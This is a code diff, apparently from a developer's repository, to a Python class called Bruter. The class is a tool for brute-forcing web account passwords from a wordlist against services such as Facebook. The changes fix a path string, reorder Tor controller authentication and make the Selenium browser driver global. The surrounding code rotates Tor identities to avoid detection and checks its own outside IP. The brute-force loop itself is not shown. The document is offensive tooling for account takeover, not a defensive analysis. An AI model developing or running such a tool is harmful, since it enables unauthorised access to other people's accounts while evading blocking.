@@ -106,10 +106,9 @@ class Bruter(object):
 
     def Tor_Check(self): # STEM Controller checking
 
+        check_status_controller = connect()
 
-        controller.authenticate(password=Hash)
-
-        if not controller:
+        if not check_status_controller:
 
             sys.stdout.write("[ " + R + "Error" + W + " ]" + " Stem controller not running" + W)
 
@@ -118,6 +117,8 @@ class Bruter(object):
             exit(1)
 
         sys.stdout.write("[ " + G + "ok" + W + " ]" + " Stem controller running\n")
+
+        controller.authenticate(password=Hash)
 
 
     def renew_tor(self):        # Reconnecting to tor by sending signal newnym
@@ -150,7 +151,9 @@ class Bruter(object):
 
        display.start()
 
-       driver = webdriver.Firefox(executable_path="/usr/local/bin/geckodriver)
+       global driver       
+
+       driver = webdriver.Firefox(executable_path="/usr/local/bin/geckodriver")
 
        self.Tor_Check()
 
@@ -189,10 +192,6 @@ class Bruter(object):
     def webBruteforce(self, username, wordlist, service, delay):
 
         my_ip = urlopen("http://ip.42.pl/raw").read()
-
-        global driver
-
-        driver = webdriver.Firefox(executable_path="/usr/local/bin/geckodriver")
 
         if service == "facebook":
 
